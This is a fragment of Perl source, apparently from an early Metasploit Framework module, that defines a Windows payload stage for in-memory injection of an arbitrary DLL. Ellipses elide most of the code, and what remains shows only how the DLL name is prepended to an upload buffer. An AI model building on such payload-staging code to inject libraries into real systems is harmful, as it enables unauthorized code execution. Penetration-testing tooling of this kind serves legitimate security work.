...
# Descrip:
#
#      In-memory library injection of an arbitrary DLL.
#
##
###############


package Msf::PayloadComponent::Windows::ia32::InjectLibStage;
...
sub HandleConnection 
{
	...
	# Prepend the DLL name to the upload buffer, including the null terminator
	$upload = $name . pack("c", 0);
